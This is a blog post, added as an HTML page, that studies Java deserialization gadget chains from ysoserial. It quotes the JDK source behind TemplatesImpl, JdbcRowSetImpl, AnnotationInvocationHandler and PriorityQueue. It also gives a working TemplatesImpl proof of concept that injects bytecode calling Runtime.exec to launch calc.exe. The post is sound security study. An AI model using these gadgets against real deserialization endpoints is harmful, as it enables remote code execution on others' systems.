@@ -1,0 +1,913 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/profile.jpg">
+  <link rel="icon" href="/img/profile.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Padishah">
+  <meta name="keywords" content="CyberSecurity, Java code audit, penetration, 网络安全, 代码审计, 渗透测试, 安全研究">
+  
+    <meta name="description" content="SinksTemplatesImpl exploit [!NOTE] Pre-requirementsCodes in this section are written with JDK7u21  TemplatesImpl provides a public approach to defining and instantiating classes from byte code. 123456">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java Deserialize Vulnerabilities, ysoserial study">
+<meta property="og:url" content="http://padishah.github.io/2023/10/1726c701d497.html">
+<meta property="og:site_name" content="Padishah&#39;s blog">
+<meta property="og:description" content="SinksTemplatesImpl exploit [!NOTE] Pre-requirementsCodes in this section are written with JDK7u21  TemplatesImpl provides a public approach to defining and instantiating classes from byte code. 123456">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-10-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-10-24T14:35:06.963Z">
+<meta property="article:author" content="Padishah">
+<meta property="article:tag" content="CyberSecurity, Java code audit, penetration, 网络安全, 代码审计, 渗透测试, 安全研究">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Java Deserialize Vulnerabilities, ysoserial study - Padishah&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"padishah.github.io","root":"/","version":"1.9.5","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Padishah's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Padishah</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">Java Deserialize Vulnerabilities, ysoserial study</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-24 00:00" pubdate>
+          October 24, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          47k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          389 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java Deserialize Vulnerabilities, ysoserial study</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Sinks"><a href="#Sinks" class="headerlink" title="Sinks"></a>Sinks</h1><h2 id="TemplatesImpl-exploit"><a href="#TemplatesImpl-exploit" class="headerlink" title="TemplatesImpl exploit"></a>TemplatesImpl exploit</h2><blockquote>
+<p>[!NOTE] Pre-requirements<br>Codes in this section are written with JDK7u21</p>
+</blockquote>
+<p><code>TemplatesImpl</code> provides a public approach to defining and instantiating classes from byte code.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;  <br>    TransletClassLoader(ClassLoader parent) &#123;  <br>        <span class="hljs-built_in">super</span>(parent);  <br>    &#125;  <br>   Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;  <br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>Backtracking, in <code>defineTransletClasses</code> method calls <code>TransletClassLoader.defineClass()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span>  <br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;  <br>  <br>    <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;  <br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());  <br>    &#125;  <br>  <br>    <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> (TransletClassLoader)  <br>        AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>() &#123;  <br>            <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;  <br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());  <br>            &#125;  <br>        &#125;);  <br>  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">classCount</span> <span class="hljs-operator">=</span> _bytecodes.length;  <br>        _class = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[classCount];  <br>  <br>        <span class="hljs-keyword">if</span> (classCount &gt; <span class="hljs-number">1</span>) &#123;  <br>            _auxClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;  <br>            _class[i] = loader.defineClass(_bytecodes[i]);  <br>            <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> _class[i].getSuperclass();  <br>  <br>            <span class="hljs-comment">// Check if this is the main class  </span><br>            <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;  <br>                _transletIndex = i;  <br>            &#125;  <br>            <span class="hljs-keyword">else</span> &#123;  <br>                _auxClasses.put(_class[i].getName(), _class[i]);  <br>            &#125;  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">if</span> (_transletIndex &lt; <span class="hljs-number">0</span>) &#123;  <br>            ErrorMsg err= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-keyword">catch</span> (ClassFormatError e) &#123;  <br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());  <br>    &#125;  <br>    <span class="hljs-keyword">catch</span> (LinkageError e) &#123;  <br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>There is a constraint that the superclass of the newly defined should be consistent with <code>AbstractTranslet</code>.</p>
+<p>Backtracking, in <code>getTransletInstance</code> method, call <code>defineTransletClasses()</code> and instantiate the newly defined class:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span>  <br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>  <br>        <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();  <br>		<br>		<span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet)_class[_transletIndex].newInstance();  <br>        translet.postInitialization();  <br>        translet.setTemplates(<span class="hljs-built_in">this</span>);  <br>        translet.setServicesMechnism(_useServicesMechanism);  <br>        <span class="hljs-keyword">if</span> (_auxClasses != <span class="hljs-literal">null</span>) &#123;  <br>            translet.setAuxiliaryClasses(_auxClasses);  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">return</span> translet;  <br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>In <code>newTransformer</code> method calls <code>getTransletInstance()</code> and it’s public so we can find its reference for further exploitation:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span>  <br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException  <br>&#123;  <br>    TransformerImpl transformer;  <br>  <br>    transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,  <br>        _indentNumber, _tfactory);  <br>  <br>    <span class="hljs-keyword">if</span> (_uriResolver != <span class="hljs-literal">null</span>) &#123;  <br>        transformer.setURIResolver(_uriResolver);  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;  <br>        transformer.setSecureProcessing(<span class="hljs-literal">true</span>);  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> transformer;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">templatesImplCls</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);  <br><span class="hljs-type">Class</span> <span class="hljs-variable">abstractTransletCls</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);  <br><span class="hljs-type">Class</span> <span class="hljs-variable">factoryCls</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>);  <br>  <br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();  <br>classPool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Gadgets.StubTransletPayload.class));  <br>  <br><span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.get(Gadgets.StubTransletPayload.class.getName());  <br><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;  <br>clazz.makeClassInitializer().insertAfter(cmd);  <br>  <br><span class="hljs-type">CtClass</span> <span class="hljs-variable">abstractTransletCtCls</span> <span class="hljs-operator">=</span> classPool.get(abstractTransletCls.getName());  <br>clazz.setSuperclass(abstractTransletCtCls);  <br><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;payload&quot;</span> + System.nanoTime();  <br>clazz.setName(className);  <br>  <br><span class="hljs-type">byte</span>[] bytecode = clazz.toBytecode();<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> templatesImplCls.newInstance();  <br>Reflections.setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecode, ClassFiles.classAsBytes(Gadgets.Foo.class)&#125;);  <br>Reflections.setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);  <br>Reflections.setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, factoryCls.newInstance());  <br>  <br>((TemplatesImpl) templates).newTransformer();<br></code></pre></td></tr></table></figure>
+
+<h2 id="JdbcRowSetImpl-exploit"><a href="#JdbcRowSetImpl-exploit" class="headerlink" title="JdbcRowSetImpl exploit"></a>JdbcRowSetImpl exploit</h2><blockquote>
+<p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8</p>
+</blockquote>
+<p>The method <code>connect()</code> of <code>JdbcRowSetImpl</code> can look up the JNDI URL stored in <code>databaseMetaData</code> property.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Connection <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>	<span class="hljs-keyword">if</span>(conn != <span class="hljs-literal">null</span>) &#123;  <br>    <span class="hljs-keyword">return</span> conn;  <br>  <br>	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (getDataSourceName() != <span class="hljs-literal">null</span>) &#123;  <br>	   ...<br>		<span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();  <br>		<span class="hljs-type">DataSource</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> (DataSource)ctx.lookup  <br>			(getDataSourceName());<br>	...<br>	&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="Kick-offs"><a href="#Kick-offs" class="headerlink" title="Kick-offs"></a>Kick-offs</h1><h2 id="AnnotationInvocationHandler-exploit"><a href="#AnnotationInvocationHandler-exploit" class="headerlink" title="AnnotationInvocationHandler exploit"></a>AnnotationInvocationHandler exploit</h2><p>This class serves as a deserialization enter point.<br>In its deserialization process, <code>entrySet()</code> and <code>getValue()</code> method will be called on its <code>memberValues</code> member. The <code>entrySet()</code> can take effect associated with proxy([[Java Deserialize Vulnerabilities ysoserial study#Using TemplatesImpl (CB1 CB2)|example]]). The <code>getValue()</code> is widely used in CommonsCollections chain.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  <br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> s.readFields();<br>    ...<br>    Map&lt;String, Object&gt; streamVals = (Map&lt;String,Object&gt;)fields.get(<span class="hljs-string">&quot;memberValues&quot;</span>, <span class="hljs-literal">null</span>);<br>	...<br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;  <br>	    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();  <br>	    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>	    Class&lt;?&gt; memberType = memberTypes.get(name);  <br>	    <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists  </span><br>	        value = memberValue.getValue();  <br>	        <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||  <br>	              value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;  <br>	            value = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(  <br>	                        objectToString(value))  <br>	                .setMember(annotationType.members().get(name));  <br>        &#125;  <br>    &#125;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="PriorityQueue-exploit"><a href="#PriorityQueue-exploit" class="headerlink" title="PriorityQueue exploit"></a>PriorityQueue exploit</h2><p>The <code>PriorityQueue</code> class is a deserialization enter point.<br>Combine it with a certain comparator(e.g. [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections2|TransformingComparator in CC2]], [[Java Deserialize Vulnerabilities ysoserial study#CommonsBeanutils|BeanComparator in CB1]]), the <code>compare()</code> method would be triggered in the deserialization process. </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    ...<br>    heapify();<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)  <br>        siftDown(i, (E) queue[i]);  <br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;  <br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)  <br>        siftDownUsingComparator(k, x);  <br>    <span class="hljs-keyword">else</span>        siftDownComparable(k, x);  <br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;  <br>    <span class="hljs-type">int</span> <span class="hljs-variable">half</span> <span class="hljs-operator">=</span> size &gt;&gt;&gt; <span class="hljs-number">1</span>;  <br>    <span class="hljs-keyword">while</span> (k &lt; half) &#123;  <br>        ...<br>        <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;  <br>            comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)  <br>            c = queue[child = right];  <br>        <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)  <br>            <span class="hljs-keyword">break</span>;  <br>        ...<br>    &#125;  <br>    ...  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="Chains"><a href="#Chains" class="headerlink" title="Chains"></a>Chains</h1><h2 id="CommonCollections"><a href="#CommonCollections" class="headerlink" title="CommonCollections"></a>CommonCollections</h2><h3 id="CommonCollections1"><a href="#CommonCollections1" class="headerlink" title="CommonCollections1"></a>CommonCollections1</h3><blockquote>
+<p>[!NOTE] Pre-requirements<br>JDK &lt; 1.8 (Tested on JDK7u21, fail on JDK1.8)<br>commons-collections:commons-collections:3.1</p>
+</blockquote>
+<blockquote>
+<p>[!NOTE]<br>There are main two variants of CC1, <code>LazyMap</code> or <code>TransformedMap</code></p>
+</blockquote>
